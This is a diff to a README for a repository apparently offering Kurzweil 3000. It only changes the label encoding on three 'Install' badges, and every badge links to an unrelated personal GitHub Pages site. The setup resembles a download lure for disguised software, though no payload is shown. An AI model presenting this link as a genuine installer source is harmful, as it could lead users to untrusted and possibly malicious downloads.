@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil%203000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil+3000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Kurzweil 3000 is a comprehensive literacy support software designed for students
 
 <div align="center">
 
-[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil%203000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil+3000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Kurzweil 3000 is a comprehensive literacy support software designed for students
 
 <div align="center">
 
-[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil%203000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kurzweil 3000](https://img.shields.io/badge/⬇_Install_Kurzweil+3000-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
